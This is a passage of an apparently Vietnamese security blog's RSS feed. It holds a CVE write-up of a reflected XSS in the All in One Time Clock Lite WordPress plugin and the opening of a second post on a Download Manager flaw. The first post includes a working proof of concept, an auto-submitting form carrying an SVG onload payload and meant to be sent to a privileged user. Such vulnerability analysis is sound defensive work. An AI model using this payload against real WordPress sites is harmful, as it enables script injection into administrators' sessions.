&amp;lt;= 14.15.4 - CVE-2025-9816&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-6832 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-07-cve-2025-6832/</link>
      <pubDate>Tue, 07 Oct 2025 17:38:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-07-cve-2025-6832/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-07-cve-2025-6832/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;&lt;strong&gt;Lỗ hổng Reflected Cross-Site Scripting (XSS)&lt;/strong&gt; trong plugin &lt;strong&gt;All in One Time Clock Lite&lt;/strong&gt; cho WordPress.&#xA;Lỗ hổng xuất phát từ tham số &lt;strong&gt;nonce&lt;/strong&gt; ở các phiên bản đến và bao gồm &lt;strong&gt;2.0&lt;/strong&gt;, do &lt;strong&gt;xử lý đầu vào không đầy đủ&lt;/strong&gt; và &lt;strong&gt;không escape đầu ra&lt;/strong&gt;.&#xA;Kẻ tấn công (kể cả không xác thực) có thể chèn các đoạn script tùy ý vào trang; những script này sẽ được thực thi khi nạn nhân thực hiện hành động bị thao túng (ví dụ: bấm vào một liên kết).&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-6832&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-6832&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Cross Site Scripting&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/aio-time-clock-lite/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress All in One Time Clock Lite Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;All in One Time Clock Lite&lt;/strong&gt;: &lt;strong&gt;v2.0&lt;/strong&gt; (vulnerable) và &lt;strong&gt;v2.0.1&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;strong&gt;Meld&lt;/strong&gt; hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Trong phiên bản &lt;strong&gt;vulnerable&lt;/strong&gt;, tham số &lt;code&gt;nonce&lt;/code&gt; được lấy trực tiếp từ &lt;code&gt;$_POST&lt;/code&gt; mà &lt;strong&gt;không qua bất kỳ sanitization nào&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$nonce = (isset($_POST[&amp;#34;nonce&amp;#34;])) ? $_POST[&amp;#34;nonce&amp;#34;] : null;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phiên bản &lt;strong&gt;patched&lt;/strong&gt;, tham số &lt;code&gt;nonce&lt;/code&gt; được xử lý bằng &lt;a href=&#34;https://developer.wordpress.org/reference/functions/sanitize_text_field/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;sanitize_text_field()&lt;/code&gt;&lt;/a&gt; trước khi sử dụng, ngăn chặn việc chèn mã độc:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$nonce = (isset($_POST[&amp;#34;nonce&amp;#34;])) ? sanitize_text_field($_POST[&amp;#34;nonce&amp;#34;]) : null;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 Bản vá bổ sung lớp lọc đầu vào cho biến &lt;code&gt;nonce&lt;/code&gt;, đảm bảo dữ liệu nhận từ request sẽ được loại bỏ ký tự nguy hiểm trước khi xử lý tiếp.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-07-cve-2025-6832/diff.png&#34;&#xA;    alt=&#34;So sánh thay đổi mã giữa bản vulnerable và bản vá&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;So sánh thay đổi mã giữa bản vulnerable và bản vá&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Lỗ hổng nằm trong hàm &lt;code&gt;aio_time_clock_lite_js()&lt;/code&gt; thuộc class &lt;code&gt;AIO_Time_Clock_Lite_Actions&lt;/code&gt; trong file &lt;code&gt;aio-time-clock-lite-actions.php&lt;/code&gt;{: .filepath}&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function aio_time_clock_lite_js()&#xA;{&#xA;    // other logic       &#xA;    $nonce = (isset($_POST[&amp;#34;nonce&amp;#34;])) ? $_POST[&amp;#34;nonce&amp;#34;] : null;&#xA;&#xA;    if (wp_verify_nonce($nonce, &amp;#39;time-clock-nonce&amp;#39;)) {&#xA;        // other logic            &#xA;    } else {&#xA;        echo json_encode(&#xA;            [&#xA;                &amp;#34;response&amp;#34;     =&amp;gt; &amp;#34;failed&amp;#34;,&#xA;                &amp;#34;message&amp;#34;      =&amp;gt; esc_attr_x(&amp;#34;Not authorized to perform this action&amp;#34;, &amp;#39;aio-time-clock-lite&amp;#39;),&#xA;                &amp;#34;nonce&amp;#34;        =&amp;gt; $nonce,&#xA;                &amp;#34;clock_action&amp;#34; =&amp;gt; $clock_action,&#xA;            ]&#xA;        );&#xA;    }&#xA;&#xA;    wp_reset_postdata();&#xA;    die();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;{: file=&amp;ldquo;aio-time-clock-lite-actions.php&amp;rdquo;}&lt;/p&gt;&#xA;&lt;p&gt;Hàm &lt;code&gt;wp_verify_nonce()&lt;/code&gt; so sánh giá trị &lt;code&gt;$nonce&lt;/code&gt; gửi từ client với giá trị hợp lệ mà server đã sinh ra trước đó bằng hàm &lt;code&gt;wp_create_nonce()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;time-clock-nonce&amp;#34; id=&amp;#34;time-clock-nonce&amp;#34; value=&amp;#34;&amp;lt;?php echo wp_create_nonce(&amp;#34;time-clock-nonce&amp;#34;); ?&amp;gt;&amp;#34;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;{: file=&amp;ldquo;aio-settings.php&amp;rdquo;}&lt;/p&gt;&#xA;&lt;p&gt;Nếu &lt;code&gt;$nonce&lt;/code&gt; không hợp lệ =&amp;gt; nhảy sang nhánh &lt;code&gt;else&lt;/code&gt; trả về &lt;strong&gt;JSON&lt;/strong&gt; báo lỗi chứa &lt;code&gt;$nonce&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Click &lt;code&gt;2 references&lt;/code&gt; ta thấy hàm &lt;code&gt;public function aio_time_clock_lite_js()&lt;/code&gt; được gọi làm callback cho các action hook:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-07-cve-2025-6832/ref1.png&#34;&#xA;    alt=&#34;Hàm aio_time_clock_lite_js() được gắn vào hai hook Ajax (authenticated &amp;amp; unauthenticated)&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Hàm aio_time_clock_lite_js() được gắn vào hai hook Ajax (authenticated &amp;amp; unauthenticated)&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_aio_time_clock_lite_js&lt;/code&gt;(authenticated).&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv_aio_time_clock_lite_js&lt;/code&gt;(unauthenticated). =&amp;gt; Focus&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;sources--sinks&#34;&gt;&lt;span&gt;Sources &amp;amp; Sinks&lt;/span&gt;&#xA;  &lt;a href=&#34;#sources--sinks&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Source&lt;/strong&gt;: Tham số &lt;code&gt;nonce&lt;/code&gt; lấy trực tiếp từ &lt;code&gt;$_POST&lt;/code&gt; (unauthenticated request).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Sink&lt;/strong&gt;: Giá trị &lt;code&gt;nonce&lt;/code&gt; được phản chiếu lại trong &lt;code&gt;echo json_encode(...)&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;Gửi POST request (unauthenticated) đến &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; với các &lt;strong&gt;params&lt;/strong&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;action=aio_time_clock_lite_js&amp;amp;nonce=nonce_value&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Callback &lt;code&gt;aio_time_clock_lite_js()&lt;/code&gt; được gọi&lt;/li&gt;&#xA;&lt;li&gt;Kiểm tra giá trị &lt;code&gt;nonce&lt;/code&gt; =&amp;gt; &lt;strong&gt;invalid&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Phản chiếu giá trị &lt;code&gt;nonce&lt;/code&gt; vào body bằng &lt;code&gt;echo json_encode(...)&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;Tạo trang web chứa form submit:&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;form action=&amp;#34;http://localhost/wp-admin/admin-ajax.php&amp;#34; method=&amp;#34;post&amp;#34;&amp;gt;&#xA;  &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;action&amp;#34; value=&amp;#34;aio_time_clock_lite_js&amp;#34;&amp;gt;&#xA;  &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;nonce&amp;#34; value=&amp;#34;&amp;lt;svg onload=alert()&amp;gt;&amp;#34;&amp;gt;&#xA;&amp;lt;/form&amp;gt;&#xA;&amp;lt;script&amp;gt;document.forms[0].submit()&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Gửi link đến trang web chứa form cho người dùng cho dặc quyền.&lt;/li&gt;&#xA;&lt;li&gt;Quan sát việc thực hiện &lt;strong&gt;JavaScript&lt;/strong&gt; được tiêm.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-07-cve-2025-6832/result.png&#34;&#xA;    alt=&#34;Result — PoC execution screenshot&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Result — PoC execution screenshot&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;CVE-2025-6832&lt;/strong&gt; trong plugin &lt;strong&gt;All in One Time Clock Lite &amp;lt;= 2.0&lt;/strong&gt; cho phép &lt;strong&gt;unauthenticated attacker&lt;/strong&gt; khai thác Reflected XSS thông qua tham số &lt;code&gt;nonce&lt;/code&gt;. Bản vá &lt;strong&gt;2.0.1&lt;/strong&gt; đã thêm &lt;code&gt;sanitize_text_field()&lt;/code&gt; để lọc input, ngăn chặn mã độc được phản chiếu trong JSON response.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Luôn &lt;strong&gt;sanitize&lt;/strong&gt; và &lt;strong&gt;escape&lt;/strong&gt; dữ liệu trước khi trả về response.&lt;/li&gt;&#xA;&lt;li&gt;Endpoint mở cho &lt;strong&gt;nopriv (unauthenticated)&lt;/strong&gt; cần được xem xét cẩn trọng.&lt;/li&gt;&#xA;&lt;li&gt;Reflected XSS thường xuất hiện khi giá trị input được phản chiếu trực tiếp trong output (JSON/HTML).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Update plugin&lt;/strong&gt; kịp thời là cách đơn giản nhất để giảm thiểu rủi ro.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Cross-site scripting (XSS) cheat sheet — PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/aio-time-clock-lite/vulnerability/wordpress-all-in-one-time-clock-lite-tracking-employee-time-has-never-been-easier-plugin-2-0-reflected-cross-site-scripting-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress All in One Time Clock Lite &amp;lt;= 2.0 — CVE-2025-6832&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-10146 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-06-cve-2025-10146/</link>
      <pubDate>Mon, 06 Oct 2025 19:18:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-06-cve-2025-10146/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-06-cve-2025-10146/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;Lỗ hổng trong plugin &lt;strong&gt;Download Manager&lt;/strong&gt; trước phiên bản &lt;strong&gt;3.3.24&lt;/strong&gt;. Dữ liệu được lấy từ &lt;strong&gt;GET&lt;/strong&gt; request được in trực tiếp vào &lt;strong&gt;HTML attribute&lt;/strong&gt;, &lt;strong&gt;reflected XSS&lt;/strong&gt; xảy ra khi người dùng có đặc quyền truy cập vào đường dẫn do attack cung cấp.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-10146&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-10146&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/download-manager&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Download Manager 